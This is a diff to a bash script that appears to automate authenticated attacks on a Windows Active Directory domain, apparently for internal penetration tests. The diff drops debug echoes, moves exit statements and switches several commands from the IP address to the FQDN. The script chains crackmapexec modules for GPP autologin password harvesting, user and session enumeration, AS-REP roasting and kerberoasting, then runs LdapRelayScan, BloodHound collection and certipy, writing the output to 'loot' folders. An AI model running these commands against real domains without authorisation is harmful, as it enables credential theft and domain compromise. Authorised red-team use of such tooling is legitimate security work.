@@ -24,23 +24,18 @@ do
     case "$opt" in
         (u)
           USER=${OPTARG}
-          echo ${OPTIND}
         ;;
         (p)
           PASS=${OPTARG}
-          echo ${OPTIND}
         ;;
         (H)
           HASH=${OPTARG}
-          echo ${OPTIND}
         ;;
         (d)
           DOM=${OPTARG}
-          echo ${OPTIND}
         ;;
         (i)
           IP=${OPTARG}
-          echo ${OPTIND}
         ;;
         (u|p|H|d|i)
           shift 2
@@ -51,12 +46,6 @@ do
         ;;
     esac
 done
-
-echo $USER
-echo $PASS
-echo $HASH
-echo $DOM
-echo $IP
 
 shift "$((OPTIND - 1))"
 [ "$1" = "--" ] && shift
@@ -85,7 +74,7 @@ then
 
  # GPP autologin
     crackmapexec smb $IP -u $USER -p $PASS -d $DOM -M gpp_autologin >> /root/output/loot/intern/ad/gpp_autologin/login.txt
-exit 0
+
  # User txt from DC
     crackmapexec smb $IP -u $USER -p $PASS -d $DOM --users > /root/output/list/raw.txt
     awk '/445/ {print$5}' /root/output/list/raw.txt | cut -d '\' -f 2 | sed '/\x1b\[[0-9;]*[mGKHF]/d' | grep -v 'HealthMailbox' > /root/output/list/user.txt
@@ -105,15 +94,15 @@ exit 0
 
  # sessions
     crackmapexec smb $IP -u $USER -p $PASS -d $DOM --sessions >> /root/output/loot/intern/ad/session
-
+echo $FQDN
  # asreproast
-    crackmapexec ldap $IP -u $USER -p $PASS -d $DOM --asreproas /root/output/loot/intern/sd/kerberos/asreproast/asrep.txt
-
+    crackmapexec ldap $FQDN -u $USER -p $PASS -d $DOM --asreproas /root/output/loot/intern/sd/kerberos/asreproast/asrep.txt
+exit 0
  # kerberoast
-   crackmapexec ldap $IP -u $USER -p $PASS -d $DOM --kerberoasting /root/output/loot/intern/sd/kerberos/kerberoasting/krb.txt
+   crackmapexec ldap $FQDN -u $USER -p $PASS -d $DOM --kerberoasting /root/output/loot/intern/sd/kerberos/kerberoasting/krb.txt
 
  # MAQ  
-   crackmapexec ldap $IP -u $USER -p $PASS -d $DOM -M MAQ >> /root/output/loot/intern/ad/quota/maq.txt
+   crackmapexec ldap $FQDN -u $USER -p $PASS -d $DOM -M MAQ >> /root/output/loot/intern/ad/quota/maq.txt
 
  # ldap signing 
     python3 /opt/LdapRelayScan/LdapRelayScan.py -u $USER -p $PASS -dc-ip $IP -method BOTH >> /root/output/loot/intern/ldap/signing/signig.txt
@@ -122,6 +111,7 @@ exit 0
     bloodhound-python -u $USER -p $PASS -d $DOM -dc $FQDN -w 50 -c all --zip
     certipy find -u $USER -p $PASS -target $IP -old-bloodhound
     mv *.zip /root/output/loot/intern/ad
+exit 0
 fi
 
 if [ -z $PASS ]
